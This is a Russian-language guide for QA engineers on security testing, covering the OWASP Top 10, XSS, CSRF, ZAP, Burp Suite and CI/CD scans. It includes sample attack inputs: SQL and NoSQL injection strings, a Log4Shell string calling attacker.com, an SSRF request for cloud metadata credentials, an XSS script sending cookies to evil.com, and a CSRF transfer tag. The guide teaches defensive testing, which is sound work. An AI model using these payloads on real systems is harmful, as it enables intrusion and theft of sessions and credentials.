# Тестирование безопасности -- обзор

## Обзор

Тестирование безопасности (Security Testing) -- это процесс проверки приложения на наличие
уязвимостей, которые могут быть использованы злоумышленниками для несанкционированного доступа,
кражи данных, нарушения работы системы или других вредоносных действий.

Для QA-инженера знание основ безопасности -- это не опция, а необходимость. Даже если
в команде есть выделенный специалист по безопасности (Security Engineer), QA должен обладать
"security mindset" -- думать как атакующий при тестировании любого функционала.

Утечка данных может стоить компании миллионы долларов, репутацию и доверие пользователей.
Многие громкие инциденты (Equifax, Yahoo, Facebook) произошли из-за уязвимостей, которые
могли быть обнаружены на этапе тестирования.

## OWASP Top 10

**OWASP** (Open Web Application Security Project) -- это некоммерческая организация,
которая публикует рекомендации по безопасности веб-приложений. **OWASP Top 10** -- это список
10 наиболее критичных категорий уязвимостей, обновляемый каждые несколько лет.

### A01: Broken Access Control -- нарушение контроля доступа

Пользователь получает доступ к ресурсам или действиям, к которым не должен иметь доступа.

**Пример: IDOR (Insecure Direct Object Reference)**
```
# Пользователь user_A авторизован и запрашивает свой заказ
GET /api/orders/12345
→ 200 OK (свой заказ -- всё корректно)

# Пользователь user_A меняет ID и запрашивает чужой заказ
GET /api/orders/12346
→ 200 OK (чужой заказ -- УЯЗВИМОСТЬ!)
```

**Что проверять (QA-перспектива):**
- Попробовать получить чужие данные, подменив ID в URL
- Проверить доступ без авторизации (удалить заголовок Authorization)
- Проверить горизонтальную эскалацию (user A видит данные user B)
- Проверить вертикальную эскалацию (обычный пользователь выполняет действия администратора)
- Проверить доступ к API-эндпоинтам, не отображённым в UI

### A02: Cryptographic Failures -- криптографические уязвимости

Недостаточная защита конфиденциальных данных: пароли в открытом виде, отсутствие HTTPS,
слабые алгоритмы шифрования.

**Пример:**
```
# Пароли хранятся в базе в открытом виде
SELECT username, password FROM users;
→ admin | admin123    ← УЯЗВИМОСТЬ!

# Правильно: хранить bcrypt/argon2 хэш
→ admin | $2b$12$LJ3m4ys3Lg...
```

**Что проверять:**
- Передаются ли данные по HTTPS (не HTTP)
- Не содержат ли ответы API конфиденциальные данные (пароли, токены, SSN)
- Не логируются ли чувствительные данные
- Используются ли современные алгоритмы хэширования

### A03: Injection -- инъекции

Передача вредоносных данных, которые интерпретируются как команды. Самый известный подтип --
**SQL Injection**.

**Пример: SQL Injection**
```
# Поле логина в форме авторизации
Ввод: admin' OR '1'='1' --

# Запрос на сервере превращается в:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
→ Условие '1'='1' всегда истинно -- авторизация пройдена без пароля!
```

**Пример: NoSQL Injection (MongoDB)**
```json
// Вместо строки передаём объект
{
  "username": "admin",
  "password": {"$ne": ""}
}
// Условие "пароль не равен пустой строке" -- всегда истинно
```

**Что проверять:**
- Вводить спецсимволы в поля: `' " ; -- /* */ { } $`
- Попробовать SQL-инъекции в поля поиска, фильтры, формы логина
- Проверить API-эндпоинты, принимающие пользовательский ввод

### A04: Insecure Design -- небезопасный дизайн

Архитектурные и дизайнерские решения, создающие уязвимости. Отличие от других категорий:
проблема не в реализации, а в самом подходе.

**Пример:**
```
# Восстановление пароля через "секретный вопрос"
Вопрос: "Какая девичья фамилия вашей матери?"
→ Легко найти в соцсетях -- небезопасный дизайн

# Лучше: одноразовый код на email/SMS с ограничением попыток
```

**Что проверять:**
- Есть ли rate limiting для критичных операций (логин, восстановление пароля)
- Есть ли защита от перебора (brute force)
- Логично ли спроектированы бизнес-процессы (нельзя ли пропустить шаг оплаты?)

### A05: Security Misconfiguration -- ошибки конфигурации

Неправильные настройки серверов, фреймворков, облачных сервисов.

**Примеры:**
```
# Включённый debug-режим на production
DEBUG = True  → Показывает stack traces, SQL-запросы, переменные окружения

# Стандартные учётные данные
admin / admin
root / root
tomcat / tomcat

# Открытые порты, ненужные сервисы
Port 22 (SSH) доступен из интернета
Port 9200 (Elasticsearch) без авторизации
```

**Что проверять:**
- Нет ли stack traces / debug-информации в ответах API
- Нет ли стандартных учётных данных
- Возвращает ли сервер заголовки безопасности (X-Frame-Options, CSP, HSTS)
- Нет ли лишних HTTP-методов (OPTIONS, TRACE)
- Правильно ли настроен CORS

### A06: Vulnerable and Outdated Components -- уязвимые компоненты

Использование библиотек, фреймворков и зависимостей с известными уязвимостями.

**Пример:**
```
# Log4j (CVE-2021-44228) -- уязвимость Log4Shell
# Злоумышленник отправляет строку в заголовке:
User-Agent: ${jndi:ldap://attacker.com/exploit}
→ Сервер выполняет произвольный код

# Spring4Shell (CVE-2022-22965)
# Уязвимость в Spring Framework позволяла удалённое выполнение кода
```

**Что проверять:**
- Регулярно сканировать зависимости (OWASP Dependency Check, Snyk, Dependabot)
- Проверять наличие CVE для используемых версий библиотек
- Убедиться, что зависимости обновлены

### A07: Identification and Authentication Failures -- ошибки аутентификации

Слабая защита процессов аутентификации: слабые пароли, отсутствие MFA,
уязвимое управление сессиями.

**Пример: Session Fixation**
```
# Атакующий создаёт сессию и передаёт жертве ссылку с session ID
https://bank.com/login?sessionid=ATTACKER_SESSION_ID

# Жертва логинится → session ID остаётся прежним
# Атакующий использует тот же session ID → доступ к аккаунту жертвы
```

**Что проверять:**
- Обновляется ли session ID после логина
- Есть ли ограничение на количество попыток входа
- Работает ли logout (инвалидируется ли токен/сессия)
- Истекают ли токены (не бессрочные ли JWT)
- Допускаются ли слабые пароли (123456, password)

### A08: Software and Data Integrity Failures -- нарушение целостности

Отсутствие проверки целостности данных и обновлений.

**Пример: Insecure Deserialization**
```java
// Приложение принимает сериализованный Java-объект от клиента
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Выполняет произвольный код из объекта!
```

### A09: Security Logging and Monitoring Failures -- недостатки логирования

Отсутствие логирования событий безопасности и мониторинга, что позволяет атакам
оставаться незамеченными.

**Что проверять:**
- Логируются ли неуспешные попытки входа
- Логируются ли изменения критичных данных
- Не логируются ли конфиденциальные данные (пароли, токены, номера карт)
- Есть ли алерты при аномальной активности

### A10: Server-Side Request Forgery (SSRF) -- подделка серверных запросов

Злоумышленник заставляет сервер выполнять запросы к внутренним ресурсам.

**Пример:**
```
# Функционал "загрузить аватар по URL"
POST /api/user/avatar
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Сервер обращается к AWS metadata API и возвращает credentials!
```

## XSS -- Cross-Site Scripting

XSS -- одна из самых распространённых уязвимостей. Злоумышленник внедряет JavaScript-код,
который выполняется в браузере жертвы.

### Типы XSS

| Тип | Описание | Пример |
|-----|----------|--------|
| **Stored XSS** | Скрипт сохраняется на сервере (в БД) | Скрипт в комментарии, отображается всем пользователям |
| **Reflected XSS** | Скрипт передаётся через URL | `?search=<script>alert('XSS')</script>` |
| **DOM-based XSS** | Скрипт выполняется на клиенте через DOM | Изменение innerHTML через пользовательский ввод |

### Пример: Stored XSS

```
# Пользователь оставляет комментарий:
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

# Если сервер не экранирует ввод, этот скрипт выполнится у всех,
# кто откроет страницу с комментарием → кража cookies
```

**Что проверять:**
- Вводить `<script>alert('XSS')</script>` в любые текстовые поля
- Проверять, экранируются ли спецсимволы (`< > " ' &`) в выводе
- Проверять URL-параметры на reflected XSS

## CSRF -- Cross-Site Request Forgery

Атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательное
действие на сайте, где жертва авторизована.

**Пример:**
```html
<!-- Злоумышленник размещает на своём сайте -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- Браузер жертвы (авторизованной в банке) отправит запрос
     с cookies банка → перевод выполнится -->
```

**Защита:** CSRF-токены, SameSite cookies, проверка Referer/Origin.

**Что проверять:**
- Есть ли CSRF-токены в формах
- Можно ли выполнить действие без CSRF-токена
- Привязан ли CSRF-токен к сессии пользователя

## Техники тестирования безопасности

### Ручные техники

| Техника | Описание |
|---------|----------|
| **Аутентификация и авторизация** | Проверка контроля доступа, эскалация привилегий |
| **Input Validation** | Ввод спецсимволов, SQL-инъекции, XSS-вектора |
| **Business Logic** | Попытки обойти бизнес-логику (пропустить оплату, изменить цену) |
| **Session Management** | Проверка cookies, токенов, таймаутов сессии |
| **Error Handling** | Анализ сообщений об ошибках (не раскрывают ли внутреннюю информацию) |

### Автоматизированные техники

| Тип | Описание | Когда использовать |
|-----|----------|-------------------|
| **SAST** (Static Application Security Testing) | Анализ исходного кода | На этапе разработки, в CI/CD |
| **DAST** (Dynamic Application Security Testing) | Сканирование работающего приложения | На staging, перед релизом |
| **IAST** (Interactive AST) | Комбинация SAST + DAST, агент в приложении | При функциональном тестировании |
| **SCA** (Software Composition Analysis) | Проверка зависимостей на CVE | В CI/CD, регулярно |

## Инструменты тестирования безопасности

### OWASP ZAP (Zed Attack Proxy)

Бесплатный open-source инструмент для DAST-тестирования.

**Возможности:**
- Автоматическое сканирование (Active/Passive Scan)
- Перехват и модификация запросов (Proxy)
- Fuzzing -- подстановка вредоносных данных
- Spidering -- обход всех страниц приложения
- Генерация отчётов

**Режимы работы:**
| Режим | Описание |
|-------|----------|
| **Automated Scan** | Быстрое сканирование по URL -- для начала |
| **Manual Explore** | Работа через прокси -- для глубокого анализа |
| **API Scan** | Импорт OpenAPI/Swagger и сканирование API |
| **CLI** | Запуск из командной строки -- для CI/CD |

**Пример запуска в Docker (CI/CD):**
```bash
# Базовое сканирование API
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \
    -t https://api.example.com/swagger.json \
    -f openapi \
    -r report.html
```

### Burp Suite

Коммерческий инструмент (есть бесплатная Community Edition) для тестирования безопасности.

**Ключевые компоненты:**
| Компонент | Описание |
|-----------|----------|
| **Proxy** | Перехват HTTP/HTTPS-трафика |
| **Scanner** | Автоматический поиск уязвимостей (Pro версия) |
| **Repeater** | Ручная отправка и модификация запросов |
| **Intruder** | Автоматизированная подстановка payload (brute force, fuzzing) |
| **Decoder** | Кодирование/декодирование данных (Base64, URL, HTML) |
| **Comparer** | Сравнение запросов/ответов |

> **OWASP ZAP vs Burp Suite:** ZAP -- бесплатный, хорошо подходит для CI/CD.
> Burp Suite Pro -- более мощный, но платный. Для начала достаточно ZAP.

## Security Testing в CI/CD

### Shift-Left Security

Принцип "сдвига влево" -- интеграция проверок безопасности как можно раньше в цикле разработки.

```
Код → SAST/SCA → Сборка → DAST → Staging → Penetration Test → Production
 ↑      ↑          ↑        ↑                     ↑
Pre-commit  CI      CI    CI/CD             Периодически
```

### Пример: GitHub Actions с OWASP ZAP

```yaml
name: Security Scan
on: [push]
jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - name: OWASP ZAP API Scan
        uses: zaproxy/action-api-scan@v0.7.0
        with:
          target: 'https://staging-api.example.com/swagger.json'
          format: openapi
          fail_action: true  # Fail pipeline при обнаружении уязвимостей
```

### Пример: SAST с SonarQube

```yaml
- name: SonarQube Scan
  run: |
    mvn sonar:sonar \
      -Dsonar.host.url=${{ secrets.SONAR_URL }} \
      -Dsonar.token=${{ secrets.SONAR_TOKEN }}
```

### Пример: SCA с OWASP Dependency Check

```yaml
- name: OWASP Dependency Check
  run: |
    mvn org.owasp:dependency-check-maven:check \
      -DfailBuildOnCVSS=7  # Fail если найдены CVE с CVSS >= 7
```

## Security Mindset для QA

### Как думать о безопасности при тестировании

1. **При тестировании форм** -- "Что если я введу не текст, а код?"
2. **При тестировании API** -- "Что если я отправлю запрос без авторизации?"
3. **При тестировании доступа** -- "Что если я изменю ID ресурса на чужой?"
4. **При тестировании загрузки файлов** -- "Что если я загружу .exe вместо .jpg?"
5. **При тестировании поиска** -- "Что если я введу SQL-запрос вместо слова?"
6. **При тестировании ошибок** -- "Что показывает страница ошибки? Нет ли там внутренних данных?"

### Чеклист безопасности для QA

- [ ] Все эндпоинты требуют аутентификации (кроме публичных)
- [ ] Невозможна горизонтальная/вертикальная эскалация привилегий
- [ ] Пользовательский ввод валидируется и экранируется
- [ ] Пароли не хранятся и не передаются в открытом виде
- [ ] HTTPS используется повсеместно
- [ ] Токены/сессии истекают, logout работает
- [ ] Ошибки не раскрывают внутреннюю информацию
- [ ] Rate limiting настроен для критичных эндпоинтов
- [ ] CORS настроен правильно (не *)
- [ ] Заголовки безопасности присутствуют (CSP, HSTS, X-Frame-Options)

## Связь с тестированием

- Security testing -- часть нефункционального тестирования, дополняющая функциональное
- Многие уязвимости (IDOR, XSS, SQL Injection) обнаруживаются при обычном функциональном тестировании, если QA обладает security mindset
- OWASP Top 10 -- минимальный чеклист, который должен знать каждый QA-инженер
- Автоматизированные security-сканы (SAST, DAST, SCA) должны быть частью CI/CD pipeline
- Результаты security-тестирования влияют на решение о релизе
- QA-инженер не заменяет специалиста по безопасности, но является первой линией обороны

## Типичные ошибки

1. **"Безопасность -- это не моя ответственность"** -- каждый член команды отвечает за безопасность.
   QA-инженер обнаруживает уязвимости чаще, чем думает.

2. **Тестирование безопасности только перед релизом** -- уязвимости нужно искать на каждом этапе.
   Shift-left: SAST в CI, DAST на staging.

3. **Ограничение тестирования автоматическими сканерами** -- сканеры не находят logic-based
   уязвимости (IDOR, бизнес-логика). Ручное тестирование обязательно.

4. **Игнорирование OWASP Top 10** -- это базовый минимум, который должен знать каждый QA.

5. **Тестирование только "happy path"** -- безопасность проверяется на "unhappy path":
   что если отправить некорректные данные? Что если обойти UI и обратиться напрямую к API?

6. **Конфиденциальные данные в тестовых средах** -- использование production-данных
   в тестовых средах создаёт риск утечки. Используйте анонимизированные данные.

7. **Отсутствие логирования результатов security-тестов** -- без документации невозможно
   отследить прогресс и убедиться, что уязвимости исправлены.

- Напишите тест-кейсы для проверки горизонтальной и вертикальной эскалации
